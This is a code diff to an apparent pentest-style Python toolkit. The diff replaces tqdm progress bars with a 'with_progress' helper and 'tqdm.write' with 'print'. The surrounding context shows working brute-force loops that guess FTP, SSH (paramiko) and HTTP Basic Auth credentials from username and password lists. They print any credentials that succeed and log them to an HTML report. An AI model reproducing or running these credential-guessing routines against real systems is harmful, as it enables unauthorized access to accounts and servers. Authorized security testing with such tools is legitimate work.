@@ -7,6 +7,7 @@ from datetime import datetime
 import time
 import random
 from utils.reporter import write_html_section
+from utils.progress import with_progress
 
 
 def clear():
@@ -102,7 +103,7 @@ def run_ftp_bruteforce():
     found_credentials = None
 
     try:
-        for current_username in usernames: # Iterate over the (potentially single) username
+        for current_username in with_progress(usernames, desc="Usernames"): # Iterate over the (potentially single) username
             for password in passwords:
                 try:
                     ftp = ftplib.FTP()
@@ -153,7 +154,6 @@ def run_ftp_bruteforce():
         input("Press Enter to return...")
 
 import os, time, random, paramiko
-from tqdm import tqdm  # install with: pip install tqdm
 
 def run_ssh_bruteforce():
     clear()
@@ -247,9 +247,9 @@ def run_ssh_bruteforce():
     found_credentials_ssh = None # Renamed to avoid conflict with other functions' variable
 
     try:
-        for current_username in tqdm(usernames, desc="Usernames", unit="user", leave=len(usernames)>1):
+        for current_username in with_progress(usernames, desc="Usernames"):
             # Only show password progress bar if there's one username, otherwise it's too noisy.
-            password_iterator = tqdm(passwords, desc=f"Trying passwords for {current_username}", unit="pw", leave=False) if len(usernames) == 1 else passwords
+            password_iterator = with_progress(passwords, desc=f"Trying passwords for {current_username}") if len(usernames) == 1 else passwords
             for password in password_iterator:
                 try:
                     # Ensure client is freshly connected for each attempt if not already connected
@@ -270,23 +270,23 @@ def run_ssh_bruteforce():
                         allow_agent=False,
                         look_for_keys=False
                     )
-                    tqdm.write(f"\n[✅] SUCCESS! Credentials: {current_username}:{password}")
+                    print(f"\n[✅] SUCCESS! Credentials: {current_username}:{password}")
                     found_credentials_ssh = f"{current_username}:{password}"
                     client.close()
                     raise StopIteration # Signal to break all loops
                 except paramiko.AuthenticationException:
-                    if len(usernames) > 1 and isinstance(password_iterator, type(passwords)): # only print if not using tqdm for passwords
-                        tqdm.write(f"[❌] Failed: {current_username}:{password}")
+                    if len(usernames) > 1: # only print if not using tqdm for passwords
+                        print(f"[❌] Failed: {current_username}:{password}")
                     # If using tqdm for passwords (single user), failed attempts are implicitly shown by progress.
                     pass  # invalid login, ignore
                 except paramiko.SSHException as e:
-                    tqdm.write(f"[⚠️ ] SSH error for {current_username}:{password}. Server busy or config issue: {e}")
+                    print(f"[⚠️ ] SSH error for {current_username}:{password}. Server busy or config issue: {e}")
                     time.sleep(random.uniform(5, 10)) # Wait a bit
                     # Depending on the error, may want to break inner or outer loop
                     # For now, break password loop for this user if SSH error occurs
                     break
                 except Exception as e:
-                    tqdm.write(f"[❌] Unexpected error for {current_username}:{password}: {e}")
+                    print(f"[❌] Unexpected error for {current_username}:{password}: {e}")
                     break # Break password loop for this user
                 finally:
                     if client._transport and client._transport.is_active():
@@ -326,7 +326,7 @@ def run_ssh_bruteforce():
             # This print was originally after the loop, moving it here to be part of the final status
             # Only print if no creds found and not aborted by other error (e.g. connection error)
             if not found_credentials_ssh: # Check if we should print this
-                 tqdm.write("\n[❌] No valid credentials found across all attempts.")
+                 print("\n[❌] No valid credentials found across all attempts.")
 
 
         write_html_section("SSH Brute-Force Results", report_lines)
@@ -418,38 +418,38 @@ def run_http_bruteforce():
 
     try:
         # Adjust tqdm behavior based on number of usernames
-        username_iterator = tqdm(usernames, desc="Usernames", unit="user", leave=len(usernames)>1) if len(usernames) > 1 else usernames
+        username_iterator = with_progress(usernames, desc="Usernames") if len(usernames) > 1 else usernames
 
         for current_username in username_iterator:
             # Show password progress bar only if there's one username
-            password_iterator = tqdm(passwords, desc=f"Passwords for {current_username}", unit="pass", leave=False) if len(usernames) == 1 else passwords
+            password_iterator = with_progress(passwords, desc=f"Passwords for {current_username}") if len(usernames) == 1 else passwords
 
             for password in password_iterator:
                 try:
                     response = requests.get(target_url, auth=HTTPBasicAuth(current_username, password), timeout=5)
 
                     if response.status_code == 200:
-                        tqdm.write(f"\n[✅] SUCCESS: {current_username}:{password} (Status: {response.status_code})")
+                        print(f"\n[✅] SUCCESS: {current_username}:{password} (Status: {response.status_code})")
                         found_credentials = f"{current_username}:{password}"
                         raise StopIteration # Signal to break from loops
                     elif response.status_code == 401:
-                        if len(usernames) > 1 or not isinstance(password_iterator, tqdm): # Print if not using detailed password tqdm
-                           tqdm.write(f"[❌] Failed: {current_username}:{password} (Status: {response.status_code} Unauthorized)")
+                        if len(usernames) > 1: # Print if not using detailed password tqdm
+                           print(f"[❌] Failed: {current_username}:{password} (Status: {response.status_code} Unauthorized)")
                         # else: tqdm implies failure for single user
                     elif response.status_code == 403:
-                        tqdm.write(f"[❌] Failed: {current_username}:{password} (Status: {response.status_code} Forbidden) - This might indicate IP ban or WAF block.")
+                        print(f"[❌] Failed: {current_username}:{password} (Status: {response.status_code} Forbidden) - This might indicate IP ban or WAF block.")
                         # Consider breaking more loops if 403 is persistent
                     else:
-                        tqdm.write(f"[⚠️ ] Info: {current_username}:{password} (Status: {response.status_code})")
+                        print(f"[⚠️ ] Info: {current_username}:{password} (Status: {response.status_code})")
 
                 except requests.exceptions.ConnectionError:
-                    tqdm.write(f"[❌] Error: Could not connect to {target_url}. Check URL and connection.")
+                    print(f"[❌] Error: Could not connect to {target_url}. Check URL and connection.")
                     connection_error_occurred = True
                     raise StopIteration # Signal to break from loops and go to finally
                 except requests.exceptions.Timeout:
-                    tqdm.write(f"[⚠️ ] Timeout for {current_username}:{password}. Server might be slow or rate-limiting.")
+                    print(f"[⚠️ ] Timeout for {current_username}:{password}. Server might be slow or rate-limiting.")
                 except requests.exceptions.RequestException as e:
-                    tqdm.write(f"[❌] Request error for {current_username}:{password}: {e}")
+                    print(f"[❌] Request error for {current_username}:{password}: {e}")
                     # Depending on the error, might want to break
                     break # Break password loop for this user on other request errors
 
@@ -492,7 +492,7 @@ def run_http_bruteforce():
             report_lines.append("Outcome: No Credentials Found")
             status_message = "[❌] No valid credentials found. Report generated."
             if not connection_error_occurred: # Only print if not a connection error
-                tqdm.write("\n[❌] No valid credentials found.")
+                print("\n[❌] No valid credentials found.")
 
 
         write_html_section("HTTP Basic Auth Brute-Force Results", report_lines)
